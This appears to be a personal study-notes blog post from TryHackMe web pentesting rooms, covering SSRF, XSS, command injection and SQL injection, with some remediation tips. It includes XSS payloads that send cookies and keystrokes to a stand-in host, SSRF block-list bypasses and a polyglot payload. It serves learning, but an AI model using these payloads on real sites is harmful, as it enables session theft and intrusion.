---
title: 'TryHackMe: Jr. Penetration Tester'
date: 2022-03-19 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-03-19-tryhackme-jr-penetration-tester.html
author: 100007
---

# TryHackMe: Jr. Penetration Tester

**author:** Nathan Acks  
**date:** 2022-03-19

As part of a job interview, I’ve been asked to run through an online CTF - the CMD+CTRL Cyber Range “LetSee Marketplace”. After reviewing the available information, I’m pretty sure I’m outclassed by this at my current skill level, but I plan to give it a shot anyway. It should be good learning/practice experience, and the worst that can happen is that I don’t get a second interview.

To get my head back into the web hacking space (I’ve been focused more on studying for the Security+ certification recently, as I want to have that in the bag sometime around the end of April / beginning of May), I’m going to spend the day working on TryHackMe (specifically rooms focusing on website penetration testing).

Qapla’!

- [CMD+CTRL Cyber Range: LetSee Marketplace](https://www.securityinnovation.com/training/cmd-ctrl-cyber-range-security-training/cyber-range-suite/cmdctrl-cyber-range-letsee/)
- [Qapla’](https://www.urbandictionary.com/define.php?term=Qapla%27)

# What Is an SSRF?

SSRF: Server-Side Request Forgery. Basically, this is when an attacker (me!) can cause the web server to make a malicious request to another server (possibly on the back-end, possibly in an entirely different organization).

SSRF can be “blind”, where not information is returned (but the request is still made).

# SSRF Examples

Directory traversal can still be used with API requests!

When attacking an API via SSRF, it’s sometimes necessary to append an empty dummy parameter (`&x=`, etc.) to break parsing of appended information. For example, suppose we have a URL like https://example.com/item?server=api&id=123 which gets translated to an API request of https://api.example.com/api/item?id=123. Then calling https://example.com/item?server=api.example.com/api/user&x=&id=123 could translate into an API request of https://api.example.com/api/user?x=.example.com/api/item?id=123, allowing us to access the /api/usr endpoint. (Note that the server here is constructing a _new_ API request string using the values of the `server` and `id` parameters. We can even add additional parameters here using `?`!)

Sometimes we can trigger a request to a server we control entirely, allowing the capture of API credentials.

# Finding an SSRF

Places to look for SSRF:

- URL bar
- Hidden form fields
- Domains embedded as GET parameters (`?server=`, etc.)
- API paths embedded as GET parameters (`?api=/user`, etc.)

“Request Bin” can be used as a stop-gap if you don’t have your own webserver available to capture requests.

- [Request Bin](https://requestbin.com/)

# Defeating Common SSRF Defenses

SSRF defenses are normally just a allowed/blocked lists.

Typically localhost and 169.254.169.254 (TryHackMe indicates that this IP often contains configuration information in cloud systems, though I’m not familiar with it) are often on block lists. This can be bypassed by using non-standard representations of IP addresses, or by using a service such as nip.io to map an arbitrary subdomain to an IP address of your choosing.

- 127.0.0.1 -\> 0x7F000001 -\> 0177000000000001 (octal) -\> 2130706433 (decimal)
- 169.254.169.254 -\> 0xA9FEA9FE -\> 0251037602510376 (octal) -\> 2852039166 (decimal)

Allowed lists are harder to circumvent; often you’ll need to be able to create your own subdomains somewhere. The ngrok service can help tunnel these subdomains back to your local system, though the SSL certificate won’t match for non-ngrok subdomains (i.e., domains you entirely control).

If the server allows for open redirects, then this functionality can also be used to block domain-based allowed lists.

- [nip.io](https://nip.io/)
- [ngrok](https://ngrok.io/)

# SSRF Practical

Note that returned SSRF information may be in a variety of formats (for example, a base64-encoded image or cookie).

# XSS Payloads

Typical (but highly annoying) XSS PoC:

```
<script>alert('XSS');</script>
```

Assuming you control the `example.com` domain, you can also log base64-encoded session cookies:

```
<script>
fetch('https://example.com/log'
+ '?cookie='
+ btoa(document.cookie)
);
</script>
```

Simple keylogger (seems best to combine with cookie stealing, since otherwise it may be hard to tell who’s typing what!):

```
<script>
document.onkeypress = function(e) {
fetch('https://example.com/log'
+ '?keypress='
+ btoa(e.key)
);
}
</script>
```

You can also use XSS to call functions defined on the target website to manipulate user accounts.

# Reflected XSS

This is when user input is echoed back in an unsafe way _without_ being stored somewhere. Places vulnerable to reflected XSS:

- GET parameters
- URL paths
- HTTP headers and POST parameters (though these are difficult to exploit in practice)

An attacker requires user cooperation to launch a reflected XSS attack - someone needs to click on a URL, open up a malicious iframe, etc.

# Stored XSS

Relevant JavaScript is stored server-side (for example, in a comment).

Basically, all places that store user information need to be tested for this. Try bypassing client-side checks with Burp Suite, et al.

- [Using Burp Suite](https://cardboard-iguana.com/notes/burp-suite.html)

# DOM-Based XSS

The difference between this and reflected XSS mostly seems to be that in DOM-based attacks we’re taking advantage of JavaScript code that’s already running on the page - basically looking for interaction points that we can control (such as `window.location.*`) that are then passed to unsafe methods (such as `eval()` or `innerHTML`). The idea is to again use a malicious link, but rather than having the code included directly in the page we’re looking to launder it through an existing (legitimate) JavaScript process.

# Blind XSS

Like stored XSS, but where the code goes someplace you can’t directly/initially observe or interact with (for example, a support portal). Because you can’t directly observe blind XSS inclusion, a callback URL (either one you control or something like XSS Hunter) is required.

- [XSS Hunter](https://xsshunter.com/)

# Perfecting Your Payload

A much less annoying XSS test than the typical `<alert/>` popup is to use something that manipulates a page element:

```
<script>
xssTest = document.querySelector("h1");
xssTest.innerHTML = "XSS was here!";
</script>
```

Note that you’ll sometimes you’ll need to break out of a tag that you’re being inserted into. Various options:

- Use `">` if you’re being inserted into an HTML attribute.
- Use `</pre>` or `</textarea>` for preformatted blocks and text areas.
- Use `';` followed by `;//` for direct JavaScript inserts. (Note that it’s only possible to insert `<script/>` tags if the JavaScript you’re abusing is being included from a file, as HTML parsers are greedy about the closing `</script>` tag.)

There is some similarity here to SQLi.

Note that JavaScript regular expressions, like PHP regular expressions, are only executed in a single pass. Thus, a regular expression that’s filtering out `<script>` and `</script>` tags can be circumvented by using `<s<script>cript>` and `</s</script>cript>`. That said, this trick doesn’t work for regular expressions that are removing single characters (for example, `<` and `>`).

You can also use the `onload` attribute to pull in JavaScript, though note that this is only functional the first time the page is loaded. This will often require you to close out the preceding attribute (`"`) and _leave off_ the trialing `"` of the `onload` attribute in order for everything to work properly.

There’s also “polygot” strings which work in a variety of contexts. These have some pretty wild escaping going on; for example, the following (lightly modified from TryHackMe’s example) produces an “XSS” alert:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert('XSS')//>>
```

How one comes up with one of these is a bit beyond me.

- [SQL Injection](https://cardboard-iguana.com/notes/sql-injection.html)

# Blind XSS Practical

You can also use `nc -nvlp $PORT` as a quick-n-dirty HTTP listener (netcat, it’s not just for catching shells anymore!).

I have some doubts about how well this works in real, modern life… Every time I tried to test this locally I pulled a CORS error…

- [Using “netcat”](https://cardboard-iguana.com/notes/netcat.html)

# What is Command Injection

Command injection - a.k.a. RCE!

# Discovering Command Injection

PHP `exec()`, Python `subprocess.Popen()`, and other other functions that directly execute operating system commands are potentially vulnerable to command injection if they accept user input.

# Exploiting Command Injection

As usual, two types:

- “Verbose” command injection returns some output to the attckers.
- “Blind” command injection does not return a value, so changes to the behavior of the server will need to be observed in order to determine if the injection was successful.

The canonical tests for blind command injection are things like `ping` and `sleep` that should cause a controllable hang. Sometimes it’s also possible to generate a file that can be read later in some way.

The Windows equivalent of `sleep` is `timeout`.

# Remediating Command Injection

PHP functions susceptible to command injection (again!): `exec()`, `passthru()`, `system()`.

Note that PHP accepts hexadecimal characters codes in strings (`/` is `/`, for example).

# In-Band SQLi

In-band SQLi is just when the results of the injection are returned directly to the attacker.

If errors are returned, then it’s generally possible to enumerate the entire database. If UNION statements can be executed, then it’s generally possible to _exfiltrate_ the entire database (see TryHackme’s “Jurassic Park” CTF).

Useful MySQL function: `GROUP_CONCAT()` concatenates fields (and arbitrary strings) in a row, and then further groups rows separated by commas (or by a string specified using SEPARATOR).

- [TryHackMe: Jurassic park](https://cardboard-iguana.com/notes/tryhackme-jurassic-park.html)

# Blind SQLi

Blind SQLi is just in-band SQLi without error messages for feedback.

## Authentication Bypasses

The trick here is that most login forms use the backing database for authentication, so all we need to do is return a “true” result - we don’t really need to guess anyone’s password. Sometimes we don’t even need to know a username (though I suspect that in practice this may lead to weird authorization problems).

## Boolean-Based SQLi

This is where we just learn if our query was successful or not. Common with API endpoints.

You can enumerate a database this way, and even exfiltrate information, but it kinda sucks. Use SQLmap, if possible.

- [Using SQLmap](https://cardboard-iguana.com/notes/sqlmap.html)

## Time-Based SQLi

This is basically boolean-based SQLi, except that we’re not even getting back true/false information anymore. However, we can introduce a timing attack by replacing a column with `sleep()` (which sleeps the connection for the specified number of seconds). If the query fails we’ll get a return immediately, but if it succeeds then we’ll experience the programmed pause.

# Out-of-Band SQLi

Out-of-band SQLi only works if the application or database makes external calls (preferably to a system we control!) based on the results of a database query (that we can inject into). Thus, there are always two channels - an attack channel and a data channel.

DNS is a popular data channel for out-of-band SQLi attacks.

# Remediating SQLi

- Use prepared statements.
- Use input validation.
- Escape strings before passing them along to SQL statements.
